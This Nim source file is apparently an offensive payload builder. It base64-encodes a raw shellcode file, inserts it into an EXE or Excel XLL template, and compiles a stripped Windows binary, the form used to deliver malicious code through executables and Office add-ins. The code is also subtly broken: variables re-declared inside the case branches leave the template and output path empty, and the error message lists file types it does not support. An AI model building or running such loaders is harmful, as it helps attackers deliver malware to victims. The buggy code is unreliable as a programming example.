import base64
import strutils
import strformat
import os
import osproc

let 
    args = commandLineParams()
    pCount = paramCount()

var 
    shellcodeFilePath: string
    fileType: string
    architecture: string
    verbosity: string

if pCount < 2:
    echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
    echo "\nArguments <architecture> for file types other than XLL and <verbose> are optional"
    quit(1)
else: 
    shellcodeFilePath = args[0]
    fileType = args[1]

    if pCount > 2:
        architecture = args[2] #only for xll payloads

    if pCount > 3:
        verbosity = args[3]

let
    compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim" 
    compileXll64: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -o=simplexll.xll temp_simplexll.nim"
    compileXll32: string = r"nim c -d:mingw --app=lib --nomain --cpu=i386 -o=simplexll.xll temp_simplexll.nim"

var 
    file: string
    templatePath: string

proc generatePayload(): void =
    var 
        templateFile: string
        tempFile: string
        compileCmd: string
    # Read raw shellcode file
    try:
        file = readFile(shellcodeFilePath)
    except IOError as err:
        echo "[-] Error: Could not open file!"
        quit(1)
    # Base64 encode bytes
    let b64shellcode = encode(file)
    # Add base64 shellcode to template
    case fileType:
        of "exe":
            templatePath = "templates/simpleexe.nim"
            var templateFile = templatePath.readFile()
            var tempFile = "temp_simpleexe.nim"
            compileCmd = compileExe
        of "xll":
            templatePath = "templates/simplexll.nim"
            var templateFile = templatePath.readFile()
            var tempFile = "temp_simplexll.nim"
            if architecture == "x64":
                compileCmd = compileXll64
            else:
                compileCmd = compileXll32
        else:
            echo "Error: filetype argument must be dll, xll, or cpl!"
            quit(1)
    let placeholder = "REPLACE_ME"
    let replacement =  b64shellcode
    templateFile = templateFile.replace(placeholder, replacement)
    tempFile.writeFile(templateFile)

    let compileResults = execCmdEx(compileCmd)
    tempFile.removeFile
    if verbosity == "verbose":
        echo compileResults.output

when isMainModule:
    if pCount >= 2:
        generatePayload()
    else:
        echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
        quit(1)
